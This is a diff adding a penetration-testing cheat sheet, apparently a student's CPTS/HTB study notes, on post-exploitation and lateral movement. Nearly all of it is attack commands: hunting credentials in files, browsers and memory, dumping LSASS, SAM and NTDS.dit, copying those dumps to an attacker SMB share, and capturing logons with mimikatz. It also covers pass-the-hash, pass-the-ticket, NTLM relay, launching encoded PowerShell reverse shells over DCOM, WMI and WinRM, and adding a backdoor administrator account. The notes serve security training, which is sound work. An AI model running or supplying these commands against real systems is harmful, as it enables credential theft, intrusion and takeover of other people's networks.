+for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+```
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--command-to-further-search-for-userpasswordpass"></a>
+
+#### Command to further search for user,password,pass
+```shell
+for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+```
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--command-to-search-for-databases"></a>
+
+#### Command to search for Databases
+```shell
+for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+```
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--command-to-search-for-txt-files"></a>
+
+#### Command to search for txt files
+```shell
+find /home/* -type f -name "*.txt" -o ! -name "*.*"
+```
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--command-to-search-for-scripts"></a>
+
+#### Command to search for scripts
+```shell
+for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+```
+
+---
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--looking-at-history"></a>
+
+### Looking at history
+
+```shell
+history
+
+tail -n5 /home/*/.bash*
+```
+
+---
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--looking-through-log-files"></a>
+
+### Looking through log files
+
+```shell
+for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+```
+
+---
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--memory-and-cache"></a>
+
+### Memory and Cache
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--mimipenguin"></a>
+
+##### Mimipenguin
+```shell
+sudo python3 mimipenguin.py
+sudo bash mimipenguin.sh 
+```
+
+- located in cpts-tools
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--lazagne"></a>
+
+##### LaZagne
+```shell
+sudo python2.7 laZagne.py all
+```
+
+---
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--browsers"></a>
+
+### Browsers
+
+```shell
+ls -l .mozilla/firefox/ | grep default 
+
+cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
+```
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--firefox_decryptpy"></a>
+
+###### Firefox_decrypt.py
+```shell
+vernonlim03@htb[/htb]$ python3.9 firefox_decrypt.py
+```
+- in cpts-tools
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--lazagne_1"></a>
+
+###### LaZagne
+```shell
+python3 laZagne.py browsers
+```
+
+---
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--linikatz"></a>
+
+### Linikatz
+
+```
+./linikatz
+```
+
+
+---
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa"></a>
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--pass-the-ticket-ptt"></a>
+
+# Pass the Ticket (PtT)
+
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--identify-if-linux-machine-is-joined-to-ad"></a>
+
+### Identify if linux machine is joined to AD
+```
+realm list
+```
+(should be installed in the system)
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--if-not-installed-look-for-these-processes"></a>
+
+##### If not installed look for these processes
+```shell
+david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
+
+root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
+root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
+root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
+root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
+```
+(if present it means it is joined to active directory)
+
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--find-keytab-files"></a>
+
+### Find keytab files
+```shell
+find / -name *keytab* -ls 2>/dev/null
+```
+
+```shell
+crontab -l
+```
+(look out for kinit)
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--finding-ccache-files"></a>
+
+### Finding ccache Files
+```shell
+env | grep -i krb5
+```
+```
+ls -la /tmp
+```
+
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--importing-ccache-file-into-current-session"></a>
+
+### Importing ccache File into current session
+```shell
+klist
+cp /tmp/krb5cc_647401106_I8I133 .
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+klist
+```
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--listing-keytab-file-information"></a>
+
+### Listing keytab file information
+
+```shell
+klist -k -t /opt/specialfiles/carlos.keytab 
+```
+
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--impersonating-user-with-a-keytab"></a>
+
+### Impersonating user with a keytab
+
+```shell
+klist 
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+klist 
+```
+
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--extracting-keytab-hashes-with-keytabextract"></a>
+
+### Extracting keytab hashes with KeyTabExtract
+```shell
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+```
+(can further use the ntlm hash to do PTH attack or crack it)
+
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--how-to-escalate"></a>
+
+### How to escalate
+- crack key and ssh in
+- relay the hash
+- use id command to check for group memberships
+
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--evil-winrm-on-kali"></a>
+
+### Evil-WinRM on Kali
+
+```shell
+sudo apt-get install krb5-user -y
+
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+(run first time setup first if not modify the /etc/krb5.conf file)
+
+
+<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--check-sudo-rights"></a>
+
+### Check sudo rights 
+```
+sudo -l
+```
+
+
+---
+
+<a id="cpts-post-exploits-windows-dcom-f7ad3a18"></a>
+
+<a id="cpts-post-exploits-windows-dcom-f7ad3a18--dcom"></a>
+
+# DCOM
+
+
+Execute both of this to gain back a reverse shell
+```powershell
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+```
+![Pasted image 20250606202144.png](cpts/assets/Pasted%20image%2020250606202144.png)
+
+
+
+---
+
+<a id="cpts-post-exploits-windows-dumping-out-credman-2c400c4d"></a>
+
+<a id="cpts-post-exploits-windows-dumping-out-credman-2c400c4d--dumping-out-credman"></a>
+
+# Dumping out CredMan
+
+```cmd
+C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
+```
+
+<a id="cpts-post-exploits-windows-dumping-out-credman-2c400c4d--enumerate-credentials-using-cmdkey"></a>
+
+#### Enumerate Credentials using cmdkey
+```cmd
+C:\Users\sadams>cmdkey /list
+```
+
+
+
+<a id="cpts-post-exploits-windows-dumping-out-credman-2c400c4d--run-cmd-as-credman-stored-user-eg-domain-user"></a>
+
+##### Run cmd as CredMan stored user (Eg domain user)
+![Pasted image 20250813102140.png](cpts/assets/Pasted%20image%2020250813102140.png)
+```cmd
+C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
+```
+
+
+<a id="cpts-post-exploits-windows-dumping-out-credman-2c400c4d--use-mimikatz"></a>
+
+## Use mimikatz
+
+
+---
+
+<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd"></a>
+
+<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--dumping-out-lsass"></a>
+
+# Dumping out LSASS
+
+
+---
+<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--task-manager-method"></a>
+
+### Task manager method
+(You need access to rdp and then task manager for this)
+
+Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
+![Pasted image 20250429093148.png](cpts/assets/Pasted%20image%2020250429093148.png)
+
+File will be saved in this directory
+```cmd
+C:\Users\loggedonusersdirectory\AppData\Local\Temp
+```
+
+- Use impacket-smbserver to transfer the file
+
+---
+
+<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--rundll32exe-comsvcsdll-method"></a>
+
+### Rundll32.exe & Comsvcs.dll Method
+
+<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--finding-lsass-pid-in-cmd"></a>
+
+##### Finding LSASS PID in cmd
+```cmd
+C:\Windows\system32> tasklist /svc
+```
+
+<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--finding-lsass-pid-in-powershell"></a>
+
+##### Finding LSASS PID in PowerShell
+```powershell
+PS C:\Windows\system32> Get-Process lsass
+```
+
+<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--creating-lsassdmp-using-powershell"></a>
+
+##### Creating lsass.dmp using PowerShell
+```powershell
+PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+```
+
+- Use impacket-smbserver to transfer the file
+
+---
+<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--pypykatz"></a>
+
+### Pypykatz
+(make sure to transfer the lsass.dmp file over to our attack host)
+
+```shell
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
+```
+
+---
+<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--cracking-the-nt-hash"></a>
+
+##### Cracking the NT Hash
+```shell
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+
+---
+<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--mimikatz"></a>
+
+### Mimikatz
+
+```bash
+./mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+If the above fails due to it being encrypted, we can try a diff approach and wait for the targeted user to lock in
+
+```bash
+./mimikatz.exe
+privilege::debug
+misc::memssp
+```
+(after this is done just pray we get a login)
+
+Credentials will then be saved in this logfile
+```bash
+type C:\Windows\System32\mimilsa.log
+```
+
+
+---
+
+<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253"></a>
+
+<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--dumping-out-ntdsdit"></a>
+
+# Dumping out NTDS.dit
+
+This file is typically stored on the domain controller and houses all domain usernames and passwords and hashes.
+
+---
+<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--connect-to-the-dc-with-evil-winrm"></a>
+
+##### Connect to the DC with Evil-WinRM
+```shell
+evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
+```
+
+<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--create-shadow-copy-of-c-drive"></a>
+
+##### Create shadow copy of C drive
+```evil-winrm
+vssadmin CREATE SHADOW /For=C:
+```
+
+<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--copy-ntdsdit-from-the-vss"></a>
+
+##### Copy NTDS.dit from the VSS
+```evil-winrm
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+```
+
+<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--copy-over-using-impacket-smbserver"></a>
+
+##### Copy over using impacket smbserver
+```evil-winrm
+cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
+```
+
+---
+
+<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--using-netexec-to-dump-ntds"></a>
+
+### Using Netexec to dump ntds
+```shell
+netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
+```
+
+---
+
+<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--cracking-the-hashes-obtained"></a>
+
+### Cracking the hashes obtained
+
+```shell
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--pass-the-hash-attack"></a>
+
+### Pass-the-Hash attack
+
+```shell
+evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
+```
+
+
+---
+
+<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60"></a>
+
+<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--dumping-out-sam"></a>
+
+# Dumping out SAM
+
+
+<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--sam-registries"></a>
+
+### SAM registries
+
+<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--use-administrator-cmd-to-run-regexe"></a>
+
+##### Use Administrator cmd to run reg.exe
+```cmd
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+```
+
+<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--use-impacket-smbserver-to-receive-the-files-on-host"></a>
+
+##### Use impacket-smbserver to receive the files on host
+```shell
+vernonlim03@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp
+```
+
+```cmd
+C:\> move sam.save \\10.10.15.16\CompData
+C:\> move security.save \\10.10.15.16\CompData
+C:\> move system.save \\10.10.15.16\CompData
+```
+
+<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--convert-to-readable-format-using-secretsdump"></a>
+
+##### Convert to readable format using secretsdump
+
+```shell
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
+---
+<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--use-secretsdumppy-to-simplify-the-process"></a>
+
+#### Use secretsdump.py to simplify the process
+- needs to have administrator compromised in order to dump out
+
+```shell
+secretsdump.py bob:'HTB_@cademy_stdnt!'@10.129.202.137
+```
+
+Subsequently just use hashcat to crack the sam hashes obtained
+
+```shell
+sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+```
+
+---
+<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--crackmapexecnetexec"></a>
+
+#### Crackmapexec/Netexec
+
+```shell-session
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+```
+
+---
+
+<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--mimikatz"></a>
+
+#### Mimikatz
+
+```powershell
+.\mimikatz.exe
+privilege::debug
+token::elevate
+lsadump::sam
+sekurlsa::logonpasswords
+```
+
+
+---
+
+<a id="cpts-post-exploits-windows-invoke-runascs-82bcc924"></a>
+
+<a id="cpts-post-exploits-windows-invoke-runascs-82bcc924--invoke-runascs"></a>
+
+# Invoke-RunasCs
+
+Useful for lateral movement to change user account
+
+```
+Import-Module .\Invoke-RunasCs.ps1
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
+```
+
+
+
+---
+
+<a id="cpts-post-exploits-windows-ntlmv2-relay-1a9fa4cb"></a>
+
+<a id="cpts-post-exploits-windows-ntlmv2-relay-1a9fa4cb--ntlmv2-relay"></a>
+
+# NTLMv2 Relay
+
+
+DK if this is allowed or useful in the exam but i shall just put it here in case it comes in handy
+
+---
+
+Run this command to start the ntlmrelayx server targetting 192.168.50.212
+```bash
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+```
+(rmb to edit the powershell command to execute the rev shell to our target host)
+
+Start the netcat listener next
+```bash
+rlwrap nc -lnvp 4444
+```
+
+Then do whatever it takes to get the desired user and machine to point to our attack host ip using 
+```
+dir \\192.168.45.235\test
+```
+
+
+---
+
+<a id="cpts-post-exploits-windows-overpass-the-hash-9f40f285"></a>
+
+<a id="cpts-post-exploits-windows-overpass-the-hash-9f40f285--overpass-the-hash"></a>
+
+# Overpass the Hash
+
+basically pass the hash but instead of directly passing the hash we are creating a kerberos ticket out of the hash then passing that kerberos ticket
+
+```mimikatz
+privilege::debug
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+```
+
+Check for the cached ticket
+```powershell
+klist
+net use \\files04 #connect to a diff ip
+klist
+```
+
+Use psexec to gain shell access on another machine
+```powershell
+.\PsExec.exe \\files04 cmd
+```
+
+
+---
+
+<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5"></a>
+
+<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--pass-the-hash"></a>
+
+# Pass the Hash
+
+If we obtain a crackable or not ntlm hash, we can always pass it around
+
+
+<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--mimikatz"></a>
+
+### Mimikatz
+```cmd
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+```
+(this will spawn another cmd.exe session and it will be the new user)
+
+
+<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--powershell-invoke-thehash"></a>
+
+### Powershell Invoke-TheHash
+(Suite of invoke can be found in cpts-tools)
+
+```powershell
+PS c:\htb> cd C:\tools\Invoke-TheHash\
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+```
+(can also insert in a powershell reverse shell script in the -Command)
+
+
+<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--impacket-psexec"></a>
+
+### Impacket-psexec
+```shell
+psexec.py administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+
+<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--impacket-wmiexec"></a>
+
+### Impacket-wmiexec
+```bash
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+```
+
+<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--netexec"></a>
+
+### Netexec
+```shell
+netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+
+<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--evil-winrm"></a>
+
+### Evil-WinRM
+```shell
+evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+
+<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--xfreerdp"></a>
+
+### XfreeRDP
+```shell
+xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+```
+
+- This will only work if the particular setting enabling restricted admin mode is turned on 
+```
+c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+
+<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--smbclient"></a>
+
+### SMBClient
+```bash
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+```
+
+<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--notes-for-pth-attack"></a>
+
+# Notes for PTH Attack
+
+UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
+```
+Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.
+```
+
+
+
+
+---
+
+<a id="cpts-post-exploits-windows-pass-the-ticket-ptt-22d39f78"></a>
+
+<a id="cpts-post-exploits-windows-pass-the-ticket-ptt-22d39f78--pass-the-ticket-ptt"></a>
+
+# Pass the Ticket (PtT)
+
+
+As much as possible execute all tools in administrator cmd
+
+---
+<a id="cpts-post-exploits-windows-pass-the-ticket-ptt-22d39f78--mimikatz-export-tickets"></a>
+
+### Mimikatz - Export Tickets
+
+```cmd
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::tickets /export
+```
+Format of tickets
+```
+
+### Rubeus - Export Tickets
+
+```cmd
+Rubeus.exe dump /nowrap
+```
+
+---
+
+### Mimikatz - Extract Kerberos keys
+```cmd
+c:\tools> mimikatz.exe
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::ekeys
+```
+
+### Mimikatz - Pass the key or OverPass the Hash
+```cmd
+c:\tools> mimikatz.exe
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+```
+
+### Rubeus - Pass the key or OverPass the Hash
+
+```cmd
+c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+```
+
+
+To do a pass the key or overpass the hash, mimikatz requires admin cmd whereas rubeus doesn't, so can fetch rc4 aes ntlm keys using mimikatz and then use rubeus
+
+---
+
+### Rubeus Pass the Ticket
+```cmd
+c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+```
+```cmd
+c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+```
+
+###### Base 64 PTT
+```cmd-session
+c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/
+```
+
+
+---
+
+### Mimikatz - Pass the Ticket
+
+```cmd
+C:\tools> mimikatz.exe 
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK
+mimikatz # exit
+```
+
+---
+
+### Mimikatz - Powershell Remoting with PTT
+
+```cmd
+C:\tools> mimikatz.exe
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+
+* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK
+
+mimikatz # exit
+Bye!
+
+c:\tools>powershell
+Windows PowerShell
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\tools> Enter-PSSession -ComputerName DC01
+```
+
+### Rubeus - Powershell Remoting with PTT
+
+```cmd
+C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+
+C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+```
+
+
+---
+
+<a id="cpts-post-exploits-windows-psexec-54de10de"></a>
+
+<a id="cpts-post-exploits-windows-psexec-54de10de--psexec"></a>
+
+# Psexec
+
+- account needs to be part of local administrators group
+- admin$ share must be available  (on by default)
+- file and printer sharing must be turned on  (on by default)
+
+```powershell
+.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+```
+
+```bash
+impacket-psexec <domain>/<username>:<password>@<vicitm ip>
+impacket-psexec corp/jen:'Nexus123!'@192.168.137.72
+
+psexec.py <username>@<ip> -hashes <NTLM Hash>
+psexec.py administrator@192.168.183.134 -hashes 
+aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd14483198ac04f
+```
+
+
+---
+
+<a id="cpts-post-exploits-windows-searching-for-traces-30841cff"></a>
+
+<a id="cpts-post-exploits-windows-searching-for-traces-30841cff--searching-for-traces"></a>
+
+# Searching for traces
+
+
+<a id="cpts-post-exploits-windows-searching-for-traces-30841cff--keywords-to-search"></a>
+
+#### Keywords to search
+![Pasted image 20250429150028.png](cpts/assets/Pasted%20image%2020250429150028.png)
+
+<a id="cpts-post-exploits-windows-searching-for-traces-30841cff--searching-tools"></a>
+
+#### Searching Tools
+- Windows search (GUI)
+- Lazagne.exe
+- findstr
+
+<a id="cpts-post-exploits-windows-searching-for-traces-30841cff--lazagneexe"></a>
+
+#### Lazagne.exe
+Just copy the file over using rdp or any method then run it
+```cmd
+C:\Users\bob\Desktop> start lazagne.exe all
+```
+
+- exploit is located in cpts-tools
+<a id="cpts-post-exploits-windows-searching-for-traces-30841cff--findstr"></a>
+
+#### Findstr
+```cmd
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+```
+
+
+---
+
+<a id="cpts-post-exploits-windows-wmi-winrm-6f7840cf"></a>
+
+<a id="cpts-post-exploits-windows-wmi-winrm-6f7840cf--wmi-winrm"></a>
+
+# WMI & WinRM
+
+
+Using wmic to spawn a process on another machine
+```cmd
+wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
+```
+
+Using wmic on powershell
+```powershell
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$Options = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
+
+
+
+Using winrs to gain remote code execution
+```cmd
+winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+```
+
+Using winrs on powershell instead
+```powershell
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+Enter-PSSession 1
+```
+
+
+---
+
+<a id="cpts-privesc-path-83561099"></a>
+
+<a id="cpts-privesc-path-83561099--path"></a>
+
+# $PATH
+
+Check for path
+
+```bash
+echo $PATH
+
+(env || set) 2>/dev/null
+```
+
+
+---
+
+<a id="cpts-privesc-ssh-keys-9d5895fc"></a>
+
+<a id="cpts-privesc-ssh-keys-9d5895fc--ssh-keys"></a>
+
+# SSH Keys
+
+
+
+
+Check home directory of users using extended ls for .ssh directory and keys, remember to check the root directory as well
+```bash
+ls -al
+```
+
+If we are able to read the file, we can copy it over to our base kali and ssh into the server
+```bash
+vernonlim03@htb[/htb]$ vim id_rsa
+vernonlim03@htb[/htb]$ chmod 600 id_rsa
+vernonlim03@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa
+
+root@10.10.10.10#
+```
